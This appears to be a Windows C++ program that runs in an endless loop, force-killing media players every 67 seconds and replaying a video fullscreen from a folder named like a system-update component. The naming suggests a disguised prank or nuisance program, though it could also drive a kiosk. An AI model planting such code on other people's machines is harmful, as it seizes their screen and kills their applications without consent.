#include <windows.h>
#include <shellapi.h>
#include <string>

// Optimized function to check if a specific player exists
bool FileExists(const std::string &path)
{
    DWORD attr = GetFileAttributesA(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS)
{
    const char *videoPath = "C:\\SysUpdateHost\\services.mp4";

    // Define standard paths for the two primary players
    std::string vlcPath = "C:\\Program Files\\VideoLAN\\VLC\\vlc.exe";
    std::string wmpPath = "C:\\Program Files\\Windows Media Player\\wmplayer.exe";

    while (true)
    {
        // CLEANUP: Close existing instances before starting a new one
        system("taskkill /F /IM vlc.exe /IM wmplayer.exe /IM Microsoft.Media.Player.exe /T >nul 2>&1");
        Sleep(500);

        bool launched = false;

        // OPTION 1: VLC (Native fullscreen mode)
        if (FileExists(vlcPath))
        {
            // --fullscreen: Starts in full screen
            // --no-video-title-show: Removes the filename text overlay
            std::string cmd = "\"" + vlcPath + "\" --fullscreen --no-video-title-show \"" + videoPath + "\"";
            WinExec(cmd.c_str(), SW_SHOWNORMAL);
            launched = true;
        }
        // OPTION 2: Windows Media Player Legacy
        else if (FileExists(wmpPath))
        {
            // /fullscreen: Native WMP command for full-screen playback
            std::string cmd = "\"" + wmpPath + "\" \"" + videoPath + "\" /fullscreen";
            WinExec(cmd.c_str(), SW_SHOWNORMAL);
            launched = true;
        }
        // OPTION 3: Fallback to System Default (New Media Player App)
        else
        {
            ShellExecuteA(NULL, "open", videoPath, NULL, NULL, SW_SHOWMAXIMIZED);
        }

        // FORCE FOCUS: Ensure the newly opened player is at the front
        if (launched)
        {
            Sleep(2500); // Wait for the player to initialize
            HWND hActive = GetForegroundWindow();
            if (hActive)
            {
                SetForegroundWindow(hActive);
                // Brings to front without permanently hiding the taskbar
                SetWindowPos(hActive, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
            }
        }

        Sleep(67000); // 67-second cycle
    }
    return 0;
}
